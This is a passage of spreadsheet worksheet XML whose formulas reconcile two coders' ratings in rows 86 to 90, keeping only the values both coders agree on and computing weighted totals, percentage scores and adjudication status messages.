        <f>IF(AND(Coder1!H86&amp;""&lt;&gt;"",Coder1!H86&amp;""=Coder2!H86&amp;""),Coder1!H86,"")</f>
        <v/>
      </c>
      <c r="I86" s="14">
        <f>IF(AND(Coder1!I86&amp;""&lt;&gt;"",Coder1!I86&amp;""=Coder2!I86&amp;""),Coder1!I86,"")</f>
        <v/>
      </c>
      <c r="J86" s="14">
        <f>IF(AND(Coder1!J86&amp;""&lt;&gt;"",Coder1!J86&amp;""=Coder2!J86&amp;""),Coder1!J86,"")</f>
        <v/>
      </c>
      <c r="K86" s="14">
        <f>IF(AND(Coder1!K86&amp;""&lt;&gt;"",Coder1!K86&amp;""=Coder2!K86&amp;""),Coder1!K86,"")</f>
        <v/>
      </c>
      <c r="L86" s="14">
        <f>IF(AND(Coder1!L86&amp;""&lt;&gt;"",Coder1!L86&amp;""=Coder2!L86&amp;""),Coder1!L86,"")</f>
        <v/>
      </c>
      <c r="M86" s="14">
        <f>IF(AND(Coder1!M86&amp;""&lt;&gt;"",Coder1!M86&amp;""=Coder2!M86&amp;""),Coder1!M86,"")</f>
        <v/>
      </c>
      <c r="N86" s="14">
        <f>IF(AND(Coder1!N86&amp;""&lt;&gt;"",Coder1!N86&amp;""=Coder2!N86&amp;""),Coder1!N86,"")</f>
        <v/>
      </c>
      <c r="O86" s="14">
        <f>IF(AND(Coder1!O86&amp;""&lt;&gt;"",Coder1!O86&amp;""=Coder2!O86&amp;""),Coder1!O86,"")</f>
        <v/>
      </c>
      <c r="P86" s="14">
        <f>IF(AND(Coder1!P86&amp;""&lt;&gt;"",Coder1!P86&amp;""=Coder2!P86&amp;""),Coder1!P86,"")</f>
        <v/>
      </c>
      <c r="Q86" s="14">
        <f>IF(AND(Coder1!Q86&amp;""&lt;&gt;"",Coder1!Q86&amp;""=Coder2!Q86&amp;""),Coder1!Q86,"")</f>
        <v/>
      </c>
      <c r="R86" s="14">
        <f>IF(AND(Coder1!R86&amp;""&lt;&gt;"",Coder1!R86&amp;""=Coder2!R86&amp;""),Coder1!R86,"")</f>
        <v/>
      </c>
      <c r="S86" s="14">
        <f>IF(AND(Coder1!S86&amp;""&lt;&gt;"",Coder1!S86&amp;""=Coder2!S86&amp;""),Coder1!S86,"")</f>
        <v/>
      </c>
      <c r="T86" s="14">
        <f>IF(AND(Coder1!T86&amp;""&lt;&gt;"",Coder1!T86&amp;""=Coder2!T86&amp;""),Coder1!T86,"")</f>
        <v/>
      </c>
      <c r="U86" s="14">
        <f>IF(AND(Coder1!U86&amp;""&lt;&gt;"",Coder1!U86&amp;""=Coder2!U86&amp;""),Coder1!U86,"")</f>
        <v/>
      </c>
      <c r="V86" s="14">
        <f>IF(AND(Coder1!V86&amp;""&lt;&gt;"",Coder1!V86&amp;""=Coder2!V86&amp;""),Coder1!V86,"")</f>
        <v/>
      </c>
      <c r="W86" s="14">
        <f>IF(AND(Coder1!W86&amp;""&lt;&gt;"",Coder1!W86&amp;""=Coder2!W86&amp;""),Coder1!W86,"")</f>
        <v/>
      </c>
      <c r="X86" s="14">
        <f>IF(AND(Coder1!X86&amp;""&lt;&gt;"",Coder1!X86&amp;""=Coder2!X86&amp;""),Coder1!X86,"")</f>
        <v/>
      </c>
      <c r="Y86" s="14">
        <f>IF(AND(Coder1!Y86&amp;""&lt;&gt;"",Coder1!Y86&amp;""=Coder2!Y86&amp;""),Coder1!Y86,"")</f>
        <v/>
      </c>
      <c r="Z86" s="14">
        <f>IF(AND(Coder1!Z86&amp;""&lt;&gt;"",Coder1!Z86&amp;""=Coder2!Z86&amp;""),Coder1!Z86,"")</f>
        <v/>
      </c>
      <c r="AA86" s="14">
        <f>IF(AND(Coder1!AA86&amp;""&lt;&gt;"",Coder1!AA86&amp;""=Coder2!AA86&amp;""),Coder1!AA86,"")</f>
        <v/>
      </c>
      <c r="AB86" s="14">
        <f>IF(AND(Coder1!AB86&amp;""&lt;&gt;"",Coder1!AB86&amp;""=Coder2!AB86&amp;""),Coder1!AB86,"")</f>
        <v/>
      </c>
      <c r="AC86" s="14">
        <f>IF(AND(Coder1!AC86&amp;""&lt;&gt;"",Coder1!AC86&amp;""=Coder2!AC86&amp;""),Coder1!AC86,"")</f>
        <v/>
      </c>
      <c r="AD86" s="14">
        <f>IF(AND(Coder1!AD86&amp;""&lt;&gt;"",Coder1!AD86&amp;""=Coder2!AD86&amp;""),Coder1!AD86,"")</f>
        <v/>
      </c>
      <c r="AE86" s="14">
        <f>IF(AND(Coder1!AE86&amp;""&lt;&gt;"",Coder1!AE86&amp;""=Coder2!AE86&amp;""),Coder1!AE86,"")</f>
        <v/>
      </c>
      <c r="AF86" s="14">
        <f>IF(AND(Coder1!AF86&amp;""&lt;&gt;"",Coder1!AF86&amp;""=Coder2!AF86&amp;""),Coder1!AF86,"")</f>
        <v/>
      </c>
      <c r="AG86" s="14">
        <f>IF(AND(Coder1!AG86&amp;""&lt;&gt;"",Coder1!AG86&amp;""=Coder2!AG86&amp;""),Coder1!AG86,"")</f>
        <v/>
      </c>
      <c r="AH86" s="14">
        <f>IF(AND(Coder1!AH86&amp;""&lt;&gt;"",Coder1!AH86&amp;""=Coder2!AH86&amp;""),Coder1!AH86,"")</f>
        <v/>
      </c>
      <c r="AI86" s="11">
        <f>IF(COUNT(E86:L86)=0,"",SUM(E86:L86))</f>
        <v/>
      </c>
      <c r="AJ86" s="11">
        <f>IF(AI86="","",N(E86)*3+N(F86)*2+N(G86)*2+N(H86)*2+N(I86)*2+N(J86)*3+N(K86)*3+N(L86)*3)</f>
        <v/>
      </c>
      <c r="AK86" s="11">
        <f>IF(AI86="","",COUNTIF(N86:AG86,1))</f>
        <v/>
      </c>
      <c r="AL86" s="11">
        <f>IF(OR(AJ86="",AJ86=0),"",ROUND(100*(AJ86-AK86)/AJ86,1))</f>
        <v/>
      </c>
      <c r="AM86" s="11">
        <f>IF(AND(Coder1!AN86=1,Coder2!AN86=1),IF(COUNTBLANK(E86:AH86)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN86" s="11">
        <f>IF(AND(Coder1!AN86=1,Coder2!AN86=1),IF(SUMPRODUCT(--(Coder1!E86:AH86&amp;""&lt;&gt;Coder2!E86:AH86&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO86" s="11" t="n"/>
    </row>
    <row r="87">
      <c r="A87" s="11">
        <f>Coder1!A87</f>
        <v/>
      </c>
      <c r="B87" s="11">
        <f>Coder1!B87</f>
        <v/>
      </c>
      <c r="C87" s="11">
        <f>Coder1!C87</f>
        <v/>
      </c>
      <c r="D87" s="11">
        <f>Coder1!D87</f>
        <v/>
      </c>
      <c r="E87" s="14">
        <f>IF(AND(Coder1!E87&amp;""&lt;&gt;"",Coder1!E87&amp;""=Coder2!E87&amp;""),Coder1!E87,"")</f>
        <v/>
      </c>
      <c r="F87" s="14">
        <f>IF(AND(Coder1!F87&amp;""&lt;&gt;"",Coder1!F87&amp;""=Coder2!F87&amp;""),Coder1!F87,"")</f>
        <v/>
      </c>
      <c r="G87" s="14">
        <f>IF(AND(Coder1!G87&amp;""&lt;&gt;"",Coder1!G87&amp;""=Coder2!G87&amp;""),Coder1!G87,"")</f>
        <v/>
      </c>
      <c r="H87" s="14">
        <f>IF(AND(Coder1!H87&amp;""&lt;&gt;"",Coder1!H87&amp;""=Coder2!H87&amp;""),Coder1!H87,"")</f>
        <v/>
      </c>
      <c r="I87" s="14">
        <f>IF(AND(Coder1!I87&amp;""&lt;&gt;"",Coder1!I87&amp;""=Coder2!I87&amp;""),Coder1!I87,"")</f>
        <v/>
      </c>
      <c r="J87" s="14">
        <f>IF(AND(Coder1!J87&amp;""&lt;&gt;"",Coder1!J87&amp;""=Coder2!J87&amp;""),Coder1!J87,"")</f>
        <v/>
      </c>
      <c r="K87" s="14">
        <f>IF(AND(Coder1!K87&amp;""&lt;&gt;"",Coder1!K87&amp;""=Coder2!K87&amp;""),Coder1!K87,"")</f>
        <v/>
      </c>
      <c r="L87" s="14">
        <f>IF(AND(Coder1!L87&amp;""&lt;&gt;"",Coder1!L87&amp;""=Coder2!L87&amp;""),Coder1!L87,"")</f>
        <v/>
      </c>
      <c r="M87" s="14">
        <f>IF(AND(Coder1!M87&amp;""&lt;&gt;"",Coder1!M87&amp;""=Coder2!M87&amp;""),Coder1!M87,"")</f>
        <v/>
      </c>
      <c r="N87" s="14">
        <f>IF(AND(Coder1!N87&amp;""&lt;&gt;"",Coder1!N87&amp;""=Coder2!N87&amp;""),Coder1!N87,"")</f>
        <v/>
      </c>
      <c r="O87" s="14">
        <f>IF(AND(Coder1!O87&amp;""&lt;&gt;"",Coder1!O87&amp;""=Coder2!O87&amp;""),Coder1!O87,"")</f>
        <v/>
      </c>
      <c r="P87" s="14">
        <f>IF(AND(Coder1!P87&amp;""&lt;&gt;"",Coder1!P87&amp;""=Coder2!P87&amp;""),Coder1!P87,"")</f>
        <v/>
      </c>
      <c r="Q87" s="14">
        <f>IF(AND(Coder1!Q87&amp;""&lt;&gt;"",Coder1!Q87&amp;""=Coder2!Q87&amp;""),Coder1!Q87,"")</f>
        <v/>
      </c>
      <c r="R87" s="14">
        <f>IF(AND(Coder1!R87&amp;""&lt;&gt;"",Coder1!R87&amp;""=Coder2!R87&amp;""),Coder1!R87,"")</f>
        <v/>
      </c>
      <c r="S87" s="14">
        <f>IF(AND(Coder1!S87&amp;""&lt;&gt;"",Coder1!S87&amp;""=Coder2!S87&amp;""),Coder1!S87,"")</f>
        <v/>
      </c>
      <c r="T87" s="14">
        <f>IF(AND(Coder1!T87&amp;""&lt;&gt;"",Coder1!T87&amp;""=Coder2!T87&amp;""),Coder1!T87,"")</f>
        <v/>
      </c>
      <c r="U87" s="14">
        <f>IF(AND(Coder1!U87&amp;""&lt;&gt;"",Coder1!U87&amp;""=Coder2!U87&amp;""),Coder1!U87,"")</f>
        <v/>
      </c>
      <c r="V87" s="14">
        <f>IF(AND(Coder1!V87&amp;""&lt;&gt;"",Coder1!V87&amp;""=Coder2!V87&amp;""),Coder1!V87,"")</f>
        <v/>
      </c>
      <c r="W87" s="14">
        <f>IF(AND(Coder1!W87&amp;""&lt;&gt;"",Coder1!W87&amp;""=Coder2!W87&amp;""),Coder1!W87,"")</f>
        <v/>
      </c>
      <c r="X87" s="14">
        <f>IF(AND(Coder1!X87&amp;""&lt;&gt;"",Coder1!X87&amp;""=Coder2!X87&amp;""),Coder1!X87,"")</f>
        <v/>
      </c>
      <c r="Y87" s="14">
        <f>IF(AND(Coder1!Y87&amp;""&lt;&gt;"",Coder1!Y87&amp;""=Coder2!Y87&amp;""),Coder1!Y87,"")</f>
        <v/>
      </c>
      <c r="Z87" s="14">
        <f>IF(AND(Coder1!Z87&amp;""&lt;&gt;"",Coder1!Z87&amp;""=Coder2!Z87&amp;""),Coder1!Z87,"")</f>
        <v/>
      </c>
      <c r="AA87" s="14">
        <f>IF(AND(Coder1!AA87&amp;""&lt;&gt;"",Coder1!AA87&amp;""=Coder2!AA87&amp;""),Coder1!AA87,"")</f>
        <v/>
      </c>
      <c r="AB87" s="14">
        <f>IF(AND(Coder1!AB87&amp;""&lt;&gt;"",Coder1!AB87&amp;""=Coder2!AB87&amp;""),Coder1!AB87,"")</f>
        <v/>
      </c>
      <c r="AC87" s="14">
        <f>IF(AND(Coder1!AC87&amp;""&lt;&gt;"",Coder1!AC87&amp;""=Coder2!AC87&amp;""),Coder1!AC87,"")</f>
        <v/>
      </c>
      <c r="AD87" s="14">
        <f>IF(AND(Coder1!AD87&amp;""&lt;&gt;"",Coder1!AD87&amp;""=Coder2!AD87&amp;""),Coder1!AD87,"")</f>
        <v/>
      </c>
      <c r="AE87" s="14">
        <f>IF(AND(Coder1!AE87&amp;""&lt;&gt;"",Coder1!AE87&amp;""=Coder2!AE87&amp;""),Coder1!AE87,"")</f>
        <v/>
      </c>
      <c r="AF87" s="14">
        <f>IF(AND(Coder1!AF87&amp;""&lt;&gt;"",Coder1!AF87&amp;""=Coder2!AF87&amp;""),Coder1!AF87,"")</f>
        <v/>
      </c>
      <c r="AG87" s="14">
        <f>IF(AND(Coder1!AG87&amp;""&lt;&gt;"",Coder1!AG87&amp;""=Coder2!AG87&amp;""),Coder1!AG87,"")</f>
        <v/>
      </c>
      <c r="AH87" s="14">
        <f>IF(AND(Coder1!AH87&amp;""&lt;&gt;"",Coder1!AH87&amp;""=Coder2!AH87&amp;""),Coder1!AH87,"")</f>
        <v/>
      </c>
      <c r="AI87" s="11">
        <f>IF(COUNT(E87:L87)=0,"",SUM(E87:L87))</f>
        <v/>
      </c>
      <c r="AJ87" s="11">
        <f>IF(AI87="","",N(E87)*3+N(F87)*2+N(G87)*2+N(H87)*2+N(I87)*2+N(J87)*3+N(K87)*3+N(L87)*3)</f>
        <v/>
      </c>
      <c r="AK87" s="11">
        <f>IF(AI87="","",COUNTIF(N87:AG87,1))</f>
        <v/>
      </c>
      <c r="AL87" s="11">
        <f>IF(OR(AJ87="",AJ87=0),"",ROUND(100*(AJ87-AK87)/AJ87,1))</f>
        <v/>
      </c>
      <c r="AM87" s="11">
        <f>IF(AND(Coder1!AN87=1,Coder2!AN87=1),IF(COUNTBLANK(E87:AH87)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN87" s="11">
        <f>IF(AND(Coder1!AN87=1,Coder2!AN87=1),IF(SUMPRODUCT(--(Coder1!E87:AH87&amp;""&lt;&gt;Coder2!E87:AH87&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO87" s="11" t="n"/>
    </row>
    <row r="88">
      <c r="A88" s="11">
        <f>Coder1!A88</f>
        <v/>
      </c>
      <c r="B88" s="11">
        <f>Coder1!B88</f>
        <v/>
      </c>
      <c r="C88" s="11">
        <f>Coder1!C88</f>
        <v/>
      </c>
      <c r="D88" s="11">
        <f>Coder1!D88</f>
        <v/>
      </c>
      <c r="E88" s="14">
        <f>IF(AND(Coder1!E88&amp;""&lt;&gt;"",Coder1!E88&amp;""=Coder2!E88&amp;""),Coder1!E88,"")</f>
        <v/>
      </c>
      <c r="F88" s="14">
        <f>IF(AND(Coder1!F88&amp;""&lt;&gt;"",Coder1!F88&amp;""=Coder2!F88&amp;""),Coder1!F88,"")</f>
        <v/>
      </c>
      <c r="G88" s="14">
        <f>IF(AND(Coder1!G88&amp;""&lt;&gt;"",Coder1!G88&amp;""=Coder2!G88&amp;""),Coder1!G88,"")</f>
        <v/>
      </c>
      <c r="H88" s="14">
        <f>IF(AND(Coder1!H88&amp;""&lt;&gt;"",Coder1!H88&amp;""=Coder2!H88&amp;""),Coder1!H88,"")</f>
        <v/>
      </c>
      <c r="I88" s="14">
        <f>IF(AND(Coder1!I88&amp;""&lt;&gt;"",Coder1!I88&amp;""=Coder2!I88&amp;""),Coder1!I88,"")</f>
        <v/>
      </c>
      <c r="J88" s="14">
        <f>IF(AND(Coder1!J88&amp;""&lt;&gt;"",Coder1!J88&amp;""=Coder2!J88&amp;""),Coder1!J88,"")</f>
        <v/>
      </c>
      <c r="K88" s="14">
        <f>IF(AND(Coder1!K88&amp;""&lt;&gt;"",Coder1!K88&amp;""=Coder2!K88&amp;""),Coder1!K88,"")</f>
        <v/>
      </c>
      <c r="L88" s="14">
        <f>IF(AND(Coder1!L88&amp;""&lt;&gt;"",Coder1!L88&amp;""=Coder2!L88&amp;""),Coder1!L88,"")</f>
        <v/>
      </c>
      <c r="M88" s="14">
        <f>IF(AND(Coder1!M88&amp;""&lt;&gt;"",Coder1!M88&amp;""=Coder2!M88&amp;""),Coder1!M88,"")</f>
        <v/>
      </c>
      <c r="N88" s="14">
        <f>IF(AND(Coder1!N88&amp;""&lt;&gt;"",Coder1!N88&amp;""=Coder2!N88&amp;""),Coder1!N88,"")</f>
        <v/>
      </c>
      <c r="O88" s="14">
        <f>IF(AND(Coder1!O88&amp;""&lt;&gt;"",Coder1!O88&amp;""=Coder2!O88&amp;""),Coder1!O88,"")</f>
        <v/>
      </c>
      <c r="P88" s="14">
        <f>IF(AND(Coder1!P88&amp;""&lt;&gt;"",Coder1!P88&amp;""=Coder2!P88&amp;""),Coder1!P88,"")</f>
        <v/>
      </c>
      <c r="Q88" s="14">
        <f>IF(AND(Coder1!Q88&amp;""&lt;&gt;"",Coder1!Q88&amp;""=Coder2!Q88&amp;""),Coder1!Q88,"")</f>
        <v/>
      </c>
      <c r="R88" s="14">
        <f>IF(AND(Coder1!R88&amp;""&lt;&gt;"",Coder1!R88&amp;""=Coder2!R88&amp;""),Coder1!R88,"")</f>
        <v/>
      </c>
      <c r="S88" s="14">
        <f>IF(AND(Coder1!S88&amp;""&lt;&gt;"",Coder1!S88&amp;""=Coder2!S88&amp;""),Coder1!S88,"")</f>
        <v/>
      </c>
      <c r="T88" s="14">
        <f>IF(AND(Coder1!T88&amp;""&lt;&gt;"",Coder1!T88&amp;""=Coder2!T88&amp;""),Coder1!T88,"")</f>
        <v/>
      </c>
      <c r="U88" s="14">
        <f>IF(AND(Coder1!U88&amp;""&lt;&gt;"",Coder1!U88&amp;""=Coder2!U88&amp;""),Coder1!U88,"")</f>
        <v/>
      </c>
      <c r="V88" s="14">
        <f>IF(AND(Coder1!V88&amp;""&lt;&gt;"",Coder1!V88&amp;""=Coder2!V88&amp;""),Coder1!V88,"")</f>
        <v/>
      </c>
      <c r="W88" s="14">
        <f>IF(AND(Coder1!W88&amp;""&lt;&gt;"",Coder1!W88&amp;""=Coder2!W88&amp;""),Coder1!W88,"")</f>
        <v/>
      </c>
      <c r="X88" s="14">
        <f>IF(AND(Coder1!X88&amp;""&lt;&gt;"",Coder1!X88&amp;""=Coder2!X88&amp;""),Coder1!X88,"")</f>
        <v/>
      </c>
      <c r="Y88" s="14">
        <f>IF(AND(Coder1!Y88&amp;""&lt;&gt;"",Coder1!Y88&amp;""=Coder2!Y88&amp;""),Coder1!Y88,"")</f>
        <v/>
      </c>
      <c r="Z88" s="14">
        <f>IF(AND(Coder1!Z88&amp;""&lt;&gt;"",Coder1!Z88&amp;""=Coder2!Z88&amp;""),Coder1!Z88,"")</f>
        <v/>
      </c>
      <c r="AA88" s="14">
        <f>IF(AND(Coder1!AA88&amp;""&lt;&gt;"",Coder1!AA88&amp;""=Coder2!AA88&amp;""),Coder1!AA88,"")</f>
        <v/>
      </c>
      <c r="AB88" s="14">
        <f>IF(AND(Coder1!AB88&amp;""&lt;&gt;"",Coder1!AB88&amp;""=Coder2!AB88&amp;""),Coder1!AB88,"")</f>
        <v/>
      </c>
      <c r="AC88" s="14">
        <f>IF(AND(Coder1!AC88&amp;""&lt;&gt;"",Coder1!AC88&amp;""=Coder2!AC88&amp;""),Coder1!AC88,"")</f>
        <v/>
      </c>
      <c r="AD88" s="14">
        <f>IF(AND(Coder1!AD88&amp;""&lt;&gt;"",Coder1!AD88&amp;""=Coder2!AD88&amp;""),Coder1!AD88,"")</f>
        <v/>
      </c>
      <c r="AE88" s="14">
        <f>IF(AND(Coder1!AE88&amp;""&lt;&gt;"",Coder1!AE88&amp;""=Coder2!AE88&amp;""),Coder1!AE88,"")</f>
        <v/>
      </c>
      <c r="AF88" s="14">
        <f>IF(AND(Coder1!AF88&amp;""&lt;&gt;"",Coder1!AF88&amp;""=Coder2!AF88&amp;""),Coder1!AF88,"")</f>
        <v/>
      </c>
      <c r="AG88" s="14">
        <f>IF(AND(Coder1!AG88&amp;""&lt;&gt;"",Coder1!AG88&amp;""=Coder2!AG88&amp;""),Coder1!AG88,"")</f>
        <v/>
      </c>
      <c r="AH88" s="14">
        <f>IF(AND(Coder1!AH88&amp;""&lt;&gt;"",Coder1!AH88&amp;""=Coder2!AH88&amp;""),Coder1!AH88,"")</f>
        <v/>
      </c>
      <c r="AI88" s="11">
        <f>IF(COUNT(E88:L88)=0,"",SUM(E88:L88))</f>
        <v/>
      </c>
      <c r="AJ88" s="11">
        <f>IF(AI88="","",N(E88)*3+N(F88)*2+N(G88)*2+N(H88)*2+N(I88)*2+N(J88)*3+N(K88)*3+N(L88)*3)</f>
        <v/>
      </c>
      <c r="AK88" s="11">
        <f>IF(AI88="","",COUNTIF(N88:AG88,1))</f>
        <v/>
      </c>
      <c r="AL88" s="11">
        <f>IF(OR(AJ88="",AJ88=0),"",ROUND(100*(AJ88-AK88)/AJ88,1))</f>
        <v/>
      </c>
      <c r="AM88" s="11">
        <f>IF(AND(Coder1!AN88=1,Coder2!AN88=1),IF(COUNTBLANK(E88:AH88)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN88" s="11">
        <f>IF(AND(Coder1!AN88=1,Coder2!AN88=1),IF(SUMPRODUCT(--(Coder1!E88:AH88&amp;""&lt;&gt;Coder2!E88:AH88&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO88" s="11" t="n"/>
    </row>
    <row r="89">
      <c r="A89" s="11">
        <f>Coder1!A89</f>
        <v/>
      </c>
      <c r="B89" s="11">
        <f>Coder1!B89</f>
        <v/>
      </c>
      <c r="C89" s="11">
        <f>Coder1!C89</f>
        <v/>
      </c>
      <c r="D89" s="11">
        <f>Coder1!D89</f>
        <v/>
      </c>
      <c r="E89" s="14">
        <f>IF(AND(Coder1!E89&amp;""&lt;&gt;"",Coder1!E89&amp;""=Coder2!E89&amp;""),Coder1!E89,"")</f>
        <v/>
      </c>
      <c r="F89" s="14">
        <f>IF(AND(Coder1!F89&amp;""&lt;&gt;"",Coder1!F89&amp;""=Coder2!F89&amp;""),Coder1!F89,"")</f>
        <v/>
      </c>
      <c r="G89" s="14">
        <f>IF(AND(Coder1!G89&amp;""&lt;&gt;"",Coder1!G89&amp;""=Coder2!G89&amp;""),Coder1!G89,"")</f>
        <v/>
      </c>
      <c r="H89" s="14">
        <f>IF(AND(Coder1!H89&amp;""&lt;&gt;"",Coder1!H89&amp;""=Coder2!H89&amp;""),Coder1!H89,"")</f>
        <v/>
      </c>
      <c r="I89" s="14">
        <f>IF(AND(Coder1!I89&amp;""&lt;&gt;"",Coder1!I89&amp;""=Coder2!I89&amp;""),Coder1!I89,"")</f>
        <v/>
      </c>
      <c r="J89" s="14">
        <f>IF(AND(Coder1!J89&amp;""&lt;&gt;"",Coder1!J89&amp;""=Coder2!J89&amp;""),Coder1!J89,"")</f>
        <v/>
      </c>
      <c r="K89" s="14">
        <f>IF(AND(Coder1!K89&amp;""&lt;&gt;"",Coder1!K89&amp;""=Coder2!K89&amp;""),Coder1!K89,"")</f>
        <v/>
      </c>
      <c r="L89" s="14">
        <f>IF(AND(Coder1!L89&amp;""&lt;&gt;"",Coder1!L89&amp;""=Coder2!L89&amp;""),Coder1!L89,"")</f>
        <v/>
      </c>
      <c r="M89" s="14">
        <f>IF(AND(Coder1!M89&amp;""&lt;&gt;"",Coder1!M89&amp;""=Coder2!M89&amp;""),Coder1!M89,"")</f>
        <v/>
      </c>
      <c r="N89" s="14">
        <f>IF(AND(Coder1!N89&amp;""&lt;&gt;"",Coder1!N89&amp;""=Coder2!N89&amp;""),Coder1!N89,"")</f>
        <v/>
      </c>
      <c r="O89" s="14">
        <f>IF(AND(Coder1!O89&amp;""&lt;&gt;"",Coder1!O89&amp;""=Coder2!O89&amp;""),Coder1!O89,"")</f>
        <v/>
      </c>
      <c r="P89" s="14">
        <f>IF(AND(Coder1!P89&amp;""&lt;&gt;"",Coder1!P89&amp;""=Coder2!P89&amp;""),Coder1!P89,"")</f>
        <v/>
      </c>
      <c r="Q89" s="14">
        <f>IF(AND(Coder1!Q89&amp;""&lt;&gt;"",Coder1!Q89&amp;""=Coder2!Q89&amp;""),Coder1!Q89,"")</f>
        <v/>
      </c>
      <c r="R89" s="14">
        <f>IF(AND(Coder1!R89&amp;""&lt;&gt;"",Coder1!R89&amp;""=Coder2!R89&amp;""),Coder1!R89,"")</f>
        <v/>
      </c>
      <c r="S89" s="14">
        <f>IF(AND(Coder1!S89&amp;""&lt;&gt;"",Coder1!S89&amp;""=Coder2!S89&amp;""),Coder1!S89,"")</f>
        <v/>
      </c>
      <c r="T89" s="14">
        <f>IF(AND(Coder1!T89&amp;""&lt;&gt;"",Coder1!T89&amp;""=Coder2!T89&amp;""),Coder1!T89,"")</f>
        <v/>
      </c>
      <c r="U89" s="14">
        <f>IF(AND(Coder1!U89&amp;""&lt;&gt;"",Coder1!U89&amp;""=Coder2!U89&amp;""),Coder1!U89,"")</f>
        <v/>
      </c>
      <c r="V89" s="14">
        <f>IF(AND(Coder1!V89&amp;""&lt;&gt;"",Coder1!V89&amp;""=Coder2!V89&amp;""),Coder1!V89,"")</f>
        <v/>
      </c>
      <c r="W89" s="14">
        <f>IF(AND(Coder1!W89&amp;""&lt;&gt;"",Coder1!W89&amp;""=Coder2!W89&amp;""),Coder1!W89,"")</f>
        <v/>
      </c>
      <c r="X89" s="14">
        <f>IF(AND(Coder1!X89&amp;""&lt;&gt;"",Coder1!X89&amp;""=Coder2!X89&amp;""),Coder1!X89,"")</f>
        <v/>
      </c>
      <c r="Y89" s="14">
        <f>IF(AND(Coder1!Y89&amp;""&lt;&gt;"",Coder1!Y89&amp;""=Coder2!Y89&amp;""),Coder1!Y89,"")</f>
        <v/>
      </c>
      <c r="Z89" s="14">
        <f>IF(AND(Coder1!Z89&amp;""&lt;&gt;"",Coder1!Z89&amp;""=Coder2!Z89&amp;""),Coder1!Z89,"")</f>
        <v/>
      </c>
      <c r="AA89" s="14">
        <f>IF(AND(Coder1!AA89&amp;""&lt;&gt;"",Coder1!AA89&amp;""=Coder2!AA89&amp;""),Coder1!AA89,"")</f>
        <v/>
      </c>
      <c r="AB89" s="14">
        <f>IF(AND(Coder1!AB89&amp;""&lt;&gt;"",Coder1!AB89&amp;""=Coder2!AB89&amp;""),Coder1!AB89,"")</f>
        <v/>
      </c>
      <c r="AC89" s="14">
        <f>IF(AND(Coder1!AC89&amp;""&lt;&gt;"",Coder1!AC89&amp;""=Coder2!AC89&amp;""),Coder1!AC89,"")</f>
        <v/>
      </c>
      <c r="AD89" s="14">
        <f>IF(AND(Coder1!AD89&amp;""&lt;&gt;"",Coder1!AD89&amp;""=Coder2!AD89&amp;""),Coder1!AD89,"")</f>
        <v/>
      </c>
      <c r="AE89" s="14">
        <f>IF(AND(Coder1!AE89&amp;""&lt;&gt;"",Coder1!AE89&amp;""=Coder2!AE89&amp;""),Coder1!AE89,"")</f>
        <v/>
      </c>
      <c r="AF89" s="14">
        <f>IF(AND(Coder1!AF89&amp;""&lt;&gt;"",Coder1!AF89&amp;""=Coder2!AF89&amp;""),Coder1!AF89,"")</f>
        <v/>
      </c>
      <c r="AG89" s="14">
        <f>IF(AND(Coder1!AG89&amp;""&lt;&gt;"",Coder1!AG89&amp;""=Coder2!AG89&amp;""),Coder1!AG89,"")</f>
        <v/>
      </c>
      <c r="AH89" s="14">
        <f>IF(AND(Coder1!AH89&amp;""&lt;&gt;"",Coder1!AH89&amp;""=Coder2!AH89&amp;""),Coder1!AH89,"")</f>
        <v/>
      </c>
      <c r="AI89" s="11">
        <f>IF(COUNT(E89:L89)=0,"",SUM(E89:L89))</f>
        <v/>
      </c>
      <c r="AJ89" s="11">
        <f>IF(AI89="","",N(E89)*3+N(F89)*2+N(G89)*2+N(H89)*2+N(I89)*2+N(J89)*3+N(K89)*3+N(L89)*3)</f>
        <v/>
      </c>
      <c r="AK89" s="11">
        <f>IF(AI89="","",COUNTIF(N89:AG89,1))</f>
        <v/>
      </c>
      <c r="AL89" s="11">
        <f>IF(OR(AJ89="",AJ89=0),"",ROUND(100*(AJ89-AK89)/AJ89,1))</f>
        <v/>
      </c>
      <c r="AM89" s="11">
        <f>IF(AND(Coder1!AN89=1,Coder2!AN89=1),IF(COUNTBLANK(E89:AH89)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN89" s="11">
        <f>IF(AND(Coder1!AN89=1,Coder2!AN89=1),IF(SUMPRODUCT(--(Coder1!E89:AH89&amp;""&lt;&gt;Coder2!E89:AH89&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO89" s="11" t="n"/>
    </row>
    <row r="90">
      <c r="A90" s="11">
        <f>Coder1!A90</f>
        <v/>
      </c>
      <c r="B90" s="11">
        <f>Coder1!B90</f>
        <v/>
      </c>
      <c r="C90" s="11">
        <f>Coder1!C90</f>
        <v/>
      </c>
      <c r="D90" s="11">
        <f>Coder1!D90</f>
        <v/>
      </c>
      <c r="E90" s="14">
        <f>IF(AND(Coder1!E90&amp;""&lt;&gt;"",Coder1!E90&amp;""=Coder2!E90&amp;""),Coder1!E90,"")</f>
        <v/>
      </c>
      <c r="F90" s="14">
        <f>IF(AND(Coder1!F90&amp;""&lt;&gt;"",Coder1!F90&amp;""=Coder2!F90&amp;""),Coder1!F90,"")</f>
        <v/>
      </c>
      <c r="G90" s="14">
        <f>IF(AND(Coder1!G90&amp;""&lt;&gt;"",Coder1!G90&amp;""=Coder2!G90&amp;""),Coder1!G90,"")</f>
        <v/>
      </c>
      <c r="H90" s="14">
        <f>IF(AND(Coder1!H90&amp;""&lt;&gt;"",Coder1!H90&amp;""=Coder2!H90&amp;""),Coder1!H90,"")</f>
        <v/>
      </c>
      <c r="I90" s="14">
        <f>IF(AND(Coder1!I90&amp;""&lt;&gt;"",Coder1!I90&amp;""=Coder2!I90&amp;""),Coder1!I90,"")</f>
        <v/>
      </c>
      <c r="J90" s="14">
        <f>IF(AND(Coder1!J90&amp;""&lt;&gt;"",Coder1!J90&amp;""=Coder2!J90&amp;""),Coder1!J90,"")</f>
        <v/>
      </c>
      <c r="K90" s="14">
